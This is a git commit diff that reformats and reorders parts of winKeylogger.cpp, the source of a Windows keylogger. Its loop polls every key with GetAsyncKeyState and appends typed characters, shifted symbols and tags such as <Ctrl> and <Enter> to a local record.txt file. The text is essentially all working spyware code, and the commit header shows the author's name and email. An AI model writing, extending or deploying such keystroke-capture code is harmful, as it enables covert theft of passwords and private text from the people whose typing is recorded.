b68f24a8548296e60344fb0943a000ee928db994
SurjoKarmakar <surjokarmakarlssj3@gmail.com>
2021-12-05 17:52:43 +0530

    update virtual keys

--- winKeylogger.cpp
+++ winKeylogger.cpp
@@ -20,7 +20,6 @@ void keylog(){
 		for(key=0 ;key<=255; key++){
 			if (GetAsyncKeyState(key) == -32767){
 				ofstream write ("record.txt", ios::app);
-
 				// Upper case key A - Z
 				//shift(0x10), cap lock(0x14)
 				if(((key>64) && (key<91)) && (GetAsyncKeyState(0x10))){
@@ -41,78 +40,60 @@ void keylog(){
 						case 48:
 							(GetAsyncKeyState(0x10)?write << ")":write << key);
 							break;
-						
 						case 49:
 							(GetAsyncKeyState(0x10)?write << "!":write << key);
 							break;
-
 						case 50:
 							(GetAsyncKeyState(0x10)?write << "@":write << key);
 							break;
-
 						case 51:
 							(GetAsyncKeyState(0x10)?write << "#":write << key);
 							break;
-
 						case 52:
 							(GetAsyncKeyState(0x10)?write << "$":write << key);
 							break;
-
 						case 53:
 							(GetAsyncKeyState(0x10)?write << "%":write << key);
 							break;
-
 						case 54:
 							(GetAsyncKeyState(0x10)?write << "^":write << key);
 							break;
-
 						case 55:
 							(GetAsyncKeyState(0x10)?write << "&":write << key);
 							break;
-
 						case 56:
 							(GetAsyncKeyState(0x10)?write << "*":write << key);
 							break;
-
 						case 57:
 							(GetAsyncKeyState(0x10)?write << "(":write << key);
-							break;
-							
+							break;	
 						// Special Symbols Virtual Key 
-						case VK_BACK:
-							write << "<BS>";  //backspace (0x08)
-							break;
-							
-						case VK_TAB:
-							write << "<Tab>"; //tab (0x09)
-							break;
-						
-						case VK_SHIFT:
-							write << "<Shift>"; //Shift (0x10) 
-							break;
-						
-						case VK_CONTROL:
-							write << "<Ctrl>"; //Ctrl (0x11) 
-							break;
-						
-						case VK_MENU:
-							write << "<Alt>"; //Ctrl (0x12) 
-							break;
-
-						case VK_CAPITAL:
-							write << "<CapsLock>"; //Caps Lock (0x14) 
-							break;
-							
 						case VK_ESCAPE:
 							write << "<Esc>"; //Esc (0x1B) 
 							break;
-
-						case VK_SPACE:
-							write << "<Space>"; //space (0x20)
+						case VK_TAB:
+							write << "<Tab>"; //Tab (0x09)
 							break;
-
+						case VK_CAPITAL:
+							write << "<CapsLock>"; //Caps Lock (0x14) 
+							break;
+						// case VK_SHIFT:
+						// 	write << "<Shift>"; //Shift (0x10) 
+						// 	break;
+						case VK_CONTROL:
+							write << "<Ctrl>"; //Ctrl (0x11) 
+							break;
+						case VK_MENU:
+							write << "<Alt>"; //Alt (0x12) 
+							break;	
+						case VK_SPACE:
+							write << "<Space>"; //Space (0x20)
+							break;	
+						case VK_BACK:
+							write << "<BackSpace>"; //Back Space (0x08)
+							break;
 						case VK_RETURN: 
-							write << "<Enter>\n";  //enter (0x0D)
+							write << "<Enter>\n"; //Enter (0x0D)
 							break;
 					}
 				}					
